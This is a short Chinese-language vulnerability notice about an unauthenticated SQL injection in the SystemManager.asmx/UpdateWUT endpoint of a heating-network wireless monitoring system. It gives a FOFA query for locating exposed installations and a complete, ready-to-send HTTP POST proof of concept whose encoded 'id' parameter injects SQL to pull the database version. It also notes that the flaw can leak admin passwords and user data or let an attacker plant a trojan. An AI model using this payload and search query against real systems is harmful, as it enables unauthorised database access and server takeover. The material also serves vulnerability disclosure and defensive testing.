## 热网无线监测系统SystemManager.asmx存在SQL注入漏洞

热网无线监测系统 SystemManager.asmx 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```
body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
```

## poc

```
POST /DataSrvs/SystemManager.asmx/UpdateWUT HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Connection: close
 
id=%28SELECT+CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28CASE+WHEN+%281675%3D1675%29+THEN+@@version+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29&name=&desc=
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407031708136.png)